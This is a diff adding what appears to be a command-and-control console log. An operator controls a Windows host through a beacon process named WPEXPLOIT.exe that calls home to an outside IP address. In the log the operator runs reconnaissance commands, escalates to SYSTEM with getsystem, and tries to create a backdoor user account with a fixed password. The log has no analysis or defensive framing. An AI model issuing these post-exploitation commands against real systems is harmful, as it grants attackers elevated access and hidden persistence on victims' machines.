@@ -1,0 +1,69 @@
+12/11 09:49:12 UTC [metadata] 67.218.111.202 <- 192.168.242.43; computer: maZtBNjE0bc58Km; user: ZXlU6fu *; process: WPEXPLOIT.exe; pid: 4820; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+12/11 09:49:34 UTC [input] <jhc> shell whoami
+12/11 09:49:34 UTC [task] <T1059> Tasked beacon to run: whoami
+12/11 09:49:34 UTC [checkin] host called home, sent: 37 bytes
+12/11 09:49:35 UTC [output]
+received output:
+maztbnje0bc58km\zxlu6fu
+
+
+12/11 09:49:41 UTC [input] <jhc> migate
+12/11 09:49:41 UTC [task] <T1059> Tasked beacon to run: migate
+12/11 09:49:41 UTC [checkin] host called home, sent: 37 bytes
+12/11 09:49:41 UTC [output]
+received output:
+'migate' is not recognized as an internal or external command,
+operable program or batch file.
+
+
+12/11 09:49:49 UTC [input] <jhc> dir
+12/11 09:49:49 UTC [task] <T1059> Tasked beacon to run: dir
+12/11 09:49:49 UTC [checkin] host called home, sent: 34 bytes
+12/11 09:49:50 UTC [output]
+received output:
+ Volume in drive C has no label.
+ Volume Serial Number is 495A-962C
+
+ Directory of C:\
+
+12/11/2023  09:52 AM                 0 0F78B956-909D-45B2-8B8D-2E5E1D522649
+12/11/2023  09:48 AM                 0 1702288084564$MAPFAILURE
+12/11/2023  09:48 AM                 0 1702288084564$OK
+12/11/2023  01:48 AM           587,776 7za.exe
+12/11/2023  09:48 AM    <DIR>          analysis
+11/10/2020  11:23 PM    <DIR>          found.000
+03/06/2018  12:57 AM    <DIR>          PerfLogs
+06/08/2023  12:03 PM    <DIR>          Program Files
+11/09/2022  01:50 PM    <DIR>          Program Files (x86)
+12/11/2023  09:52 AM            86,368 SandboxFltr.log
+12/11/2023  09:48 AM    <DIR>          share
+01/29/2019  07:06 AM    <DIR>          tempdir
+05/31/2023  12:18 PM    <DIR>          TorService
+12/11/2023  09:48 AM    <DIR>          Users
+12/11/2023  09:48 AM    <DIR>          VxStream
+12/11/2023  01:48 AM            62,967 winclient.au3
+12/11/2023  09:52 AM             4,596 winclient.log
+11/09/2022  01:55 PM    <DIR>          Windows
+12/11/2023  09:48 AM           116,964 winprepare.au3
+12/11/2023  09:48 AM             5,938 winprepare.log
+12/11/2023  09:48 AM             3,072 WPEXPLOIT.exe
+              10 File(s)        867,681 bytes
+              11 Dir(s)  39,823,114,240 bytes free
+
+
+12/11 09:50:09 UTC [input] <jhc> getsystem
+12/11 09:50:09 UTC [task] <T1134> Tasked beacon to get SYSTEM
+12/11 09:50:09 UTC [checkin] host called home, sent: 2743 bytes
+12/11 09:50:12 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+12/11 09:50:29 UTC [input] <jhc> shell net user $jhc Mafia@123! /add
+12/11 09:50:29 UTC [task] <T1059> Tasked beacon to run: net user $jhc Mafia@123! /add
+12/11 09:50:29 UTC [checkin] host called home, sent: 60 bytes
+12/11 09:50:29 UTC [error] could not spawn C:\WINDOWS\system32\cmd.exe /C net user $jhc Mafia@123! /add (token): 5
+12/11 10:08:11 UTC [input] <jhc> shell whoami
+12/11 10:08:11 UTC [task] <T1059> Tasked beacon to run: whoami
+12/11 10:25:02 UTC [input] <jhc> shell whoami
+12/11 10:25:02 UTC [task] <T1059> Tasked beacon to run: whoami
+12/11 10:53:03 UTC [input] <jhc> shell whoami
+12/11 10:53:03 UTC [task] <T1059> Tasked beacon to run: whoami
